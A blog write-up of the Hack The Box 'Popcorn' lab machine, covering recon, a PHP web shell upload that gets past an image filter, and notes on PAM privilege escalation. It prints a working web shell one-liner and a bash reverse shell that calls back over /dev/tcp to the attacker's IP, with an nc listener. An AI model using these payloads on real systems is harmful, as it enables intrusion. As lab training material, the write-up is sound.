---
title: htb popcorn
author: Yuchao
date: 2021-03-15 11:33:00 +0800
categories: [sec]
tags: [htb, pam, dirtycow]
math: true
mermaid: true
---

## Recon

#### nmap 
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
```
- OpenSSH 5.1p1, Apache httpd 2.2.12  ---> older than Ubuntu Trusty 14.04 ---> Karmic (9.10)

#### Directory discovery
```bash
# directory discover
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root-med -t 40
```
- get the path: /test (Status: 200) /index (Status: 200) /torrent (Status: 301) /rename (Status: 301)
- show a PHP info page.
- ``` file_uploads ``` is set to ON
- may vulnerable to Local File Inclusion.(LFI)
- /torrent can upload image as screen shot
- and the picture is saved at ``` http://10.10.10.6/torrent/upload/ ```

## upload webshell
#### manipulate php to bypass picture filters
- 1. file extension (the server did not have check this)
- 2. Content-Type header (this filter works on the server)
- 3. magic bytes (did not work)

so just change the http header,
add the php code before a png content in Burpsuite.
```php
<?php system($_REQUEST["cmd"]);?>
```

#### upload
cmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf7d3054713.php.

#### execute
``` curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id ```

## reverse shell
webshell
```bash
curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
```
attacker
```bash
nc -lnvp 443
```
upgrade the shell
``` bash
python -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo
fg
```

## privesc

#### Method 1: Linux PAM vulnerability
show the programs use PAM
```
$ ls /etc/pam.d 
chfn common-account common-session lightdm login passwd runuser sshd  su-l chpasswd  common-auth common-session-noninteractive lightdm-autologin newusers polkit-1 runuser-l su
chsh common-password  cron lightdm-greeter other ppp samba sudo
```
The pam modules directory. Can be configured to the programs above
```
/usr/lib/x86_64-linux-gnu/security
```
at user`s file
``` find . -type f -ls ```
``` /.cache/motd.legal-displayed ``` looks interesting.
- Googling for “motd.legal-displayed privesc”
- https://www.exploit-db.com/exploits/14339
- Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation
- PAM will create ``` .cache/motd.legal-displayed ``` when login.
- https://askubuntu.com/questions/256020/how-can-i-stop-the-automatic-creation-of-cache-motd-legal-displayed-file
- sshd use pam to authenticate, so we need to ssh to the box.(as www-data)


#### Method 2: Dirty Cow

